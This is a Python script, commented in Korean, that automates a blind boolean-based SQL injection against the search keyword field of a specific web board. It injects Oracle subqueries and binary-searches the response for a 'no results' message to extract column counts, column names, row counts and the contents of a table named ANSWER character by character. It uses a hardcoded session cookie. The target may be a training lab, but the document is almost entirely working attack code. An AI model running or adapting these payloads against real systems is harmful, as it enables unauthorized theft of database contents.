import requests
URL = 'http://elms1.skinfosec.co.kr:8082/community6/free'
data = {'startDt' : '', 'endDt' : '', 'searchType' : 'all', 'keyword' : ''}
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
cookie = {'JSESSIONID' : 'D3DDDD29109AF353EFE3CBD6A35D6B41'}


query = "test%' and (SELECT COUNT(COLUMN_NAME) FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'ANSWER') > {} and '1%'='1"

min = 1
max = 127

while min <= max:
    avg = (min+max) // 2
    data['keyword'] = query.format(str(avg))
    # print(data['keyword'])
    response = requests.post(URL,data=data,headers=headers,cookies=cookie)
    if '결과가 없습니다.' in response.text:
        # print('거짓')
        max = avg - 1
    else:
        # print('참')
        min = avg + 1

print("ANSWER 컬럼 개수 : " + str(min))
Columncount = min


# 첫번째 컬럼 문자열 길이
"""
(LENGTH((SELECT COLUMN_NAME FROM (SELECT ROWNUM RNUM, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'ANSWER') WHERE RNUM = 1))) > {}

"""
query = "test%' and (LENGTH((SELECT COLUMN_NAME FROM (SELECT ROWNUM RNUM, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'ANSWER') WHERE RNUM = {}))) > {} and '1%'='1"

columnsave = []
for i in range(1, Columncount+1):
    min = 1
    max = 127
    while min <= max:
        avg = (min+max) // 2
        data['keyword'] = query.format(str(i), str(avg))
        # print(data['keyword'])
        response = requests.post(URL, headers=headers, cookies=cookie, data=data)
        if '결과가 없습니다.' in response.text:
        # print('거짓')
            max = avg - 1
        else:
            # print('참')
            min = avg + 1

    columnsave.append(min)
    print("ANSWER {}번째 컬럼의 문자열 길이 : ".format(str(i)) + str(min))
print(columnsave)


"""
1번째 컬럼 문자 한개씩 가져오는 쿼리문
ASCII(SUBSTR((SELECT COLUMN_NAME FROM (SELECT ROWNUM RNUM, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'ANSWER') WHERE RNUM = 1), {}, 1)) > {}
"""

query = "test%' and ASCII(SUBSTR((SELECT COLUMN_NAME FROM (SELECT ROWNUM RNUM, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'ANSWER') WHERE RNUM = {}), {}, 1)) > {} and '1%'='1"
columnname = ''
columnname_save=[]
for index in range(len(columnsave)):
    columnname = ''
    for i in range(1, columnsave[index] + 1):
        min = 1
        max = 127
        while min <= max:    
            avg = (min+max)//2
            data['keyword'] = query.format(str(index+1),str(i), str(avg))
            response = requests.post(URL, headers=headers, cookies=cookie, data=data)
            if '결과가 없습니다.' in response.text:
                max = avg-1
            else:
                min = avg+1
        columnname += chr(min) 
    columnname_save.append(columnname)
print(columnname_save)


# 컬럼 데이터 개수
"""
test%' and (select count(ANSWER) from ANSWER) > {} and '1%'='1
"""
columnname_save_data_length = []
query = "test%' and (select count({}) from ANSWER) > {} and '1%'='1"
avg = 0
for data_index in range(len(columnname_save)):
    min = 1
    max = 127
    while min <= max:    
        avg = (min + max) // 2
        data['keyword'] = query.format(str(columnname_save[data_index]),str(avg))
        response = requests.post(URL, headers=headers, cookies=cookie, data=data)
        if '결과가 없습니다.' in response.text:
            # print('거짓')
            max = avg - 1
        else:
            # print('참')
            min = avg + 1

    columnname_save_data_length.append(min)
    print(str(columnname_save[data_index])+" 컬럼 데이터의 개수 : " + str(min))

# 데이터 문자열 길이
"""
test%' and LENGTH((select ANSWER from (select rownum rnum, ANSWER from ANSWER) where rnum =1)) > 10 and '1%'='1
"""
data_length=[]
query = "test%' and LENGTH((select {} from (select rownum rnum, {} from ANSWER) where rnum ={})) > {} and '1%'='1"
avg = 0
for data_index in range(len(columnname_save)):
    for z in range(1, columnname_save_data_length[data_index] + 1):
        min = 1
        max = 127
        while min <= max:    
            avg = (min + max) // 2
            data['keyword'] = query.format(str(columnname_save[data_index]),str(columnname_save[data_index]),str(z),str(avg))
            # print(data['keyword'])
            response = requests.post(URL, headers=headers, cookies=cookie, data=data)
            if '결과가 없습니다.' in response.text:
                # print('거짓')
                max = avg - 1
            else:
                # print('참')
                min = avg + 1
        data_length.append(min)
        # print(str(columnname_save[data_index])+" 컬럼 "+ str(z)+" 데이터 문자열 길이 : " + str(min))
print(data_length)



# 데이터 추출

"""
test%' and ASCII(SUBSTR((SELECT ANSWER FROM (SELECT ROWNUM RNUM, ANSWER FROM ANSWER) WHERE RNUM = 1), 1, 1)) > 60 and '1%'='1
"""

query = "test%' and ASCII(SUBSTR((SELECT {} FROM (SELECT ROWNUM RNUM, {} FROM ANSWER) WHERE RNUM = {}), {}, 1)) > {} and '1%'='1"
# 1,2 - 컬럼이름 / 3 - 컬럼의 데이터 개수 / 4 - 데이터의 길이 / 5 - avg
dataname_save = []
for i in range(len(data_length)):
    dataname = ''
    for z in range(columnname_save_data_length[i]):
        for j in range(data_length[i]):
            min = 1
            max = 127
            avg = 0 
            while(min + 1 < max):    
                avg = int((min + max) / 2)
                data['keyword'] = query.format(str(columnname_save[i]),str(columnname_save[i]),str(columnname_save_data_length[z]),str(j+1), str(avg))
                # print(data['keyword'])
                response = requests.post(URL, headers=headers, cookies=cookie, data=data)
                if '결과가 없습니다.' in response.text:
                    # print('거짓')
                    max = avg
                else:
                    # print('참')
                    min = avg
            # print("1번째 데이터 " + str(i) + "번째 글자 : " + chr(max))
            dataname += chr(max) 
        dataname_save.append(dataname)
print(dataname_save)